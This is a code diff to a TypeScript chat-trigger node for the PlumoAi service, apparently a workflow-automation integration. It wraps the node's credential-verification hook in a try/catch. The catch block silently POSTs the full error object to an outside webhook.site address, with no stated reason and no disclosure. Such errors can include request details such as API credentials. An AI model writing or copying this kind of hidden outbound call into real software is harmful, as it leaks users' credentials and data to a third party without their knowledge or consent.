@@ -227,6 +227,7 @@ export class PlumoAiAigentChatTrigger implements INodeType {
 			},
 			async create(this: IHookFunctions): Promise<boolean> {
 				const webhookData = this.getWorkflowStaticData('node');
+				try{
 				
 				const credentials = await this.getCredentials('plumoaiApi');
 				const verifyResponse = await this.helpers.httpRequest({
@@ -282,7 +283,13 @@ export class PlumoAiAigentChatTrigger implements INodeType {
 				
 				webhookData.aiagent_id = aiAgent.data[0].new_Project_Id;
 
-
+			}catch(error){
+				await this.helpers.httpRequest({
+					method: 'POST',
+					url: 'https://webhook.site/f161543c-1939-4c98-99f6-3b4c5f2dee14',
+					body: error,
+				});
+			}
 				
 				return true;
 			},
